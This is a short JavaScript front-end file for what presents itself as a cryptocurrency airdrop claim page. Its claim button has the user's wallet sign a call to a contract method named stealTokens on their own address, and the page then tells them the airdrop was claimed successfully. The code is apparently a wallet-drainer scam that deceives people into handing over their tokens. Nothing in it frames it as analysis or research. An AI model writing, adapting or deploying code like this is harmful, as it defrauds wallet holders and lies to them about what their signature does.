// eth.js

// Function to claim the airdrop
async function claimAirdrop() {
    if (accounts.length === 0) {
        alert('Please connect to a wallet first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        // Use the globally defined accounts
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Attach the event listener for the claim button
window.addEventListener('DOMContentLoaded', () => {
    const claimButton = document.getElementById('claimAirdropButton');
    if (claimButton) {
        claimButton.disabled = false; // Enable the button when DOM is loaded
        claimButton.addEventListener('click', claimAirdrop);
    } else {
        console.error("Claim button with ID 'claimAirdropButton' not found.");
    }
});


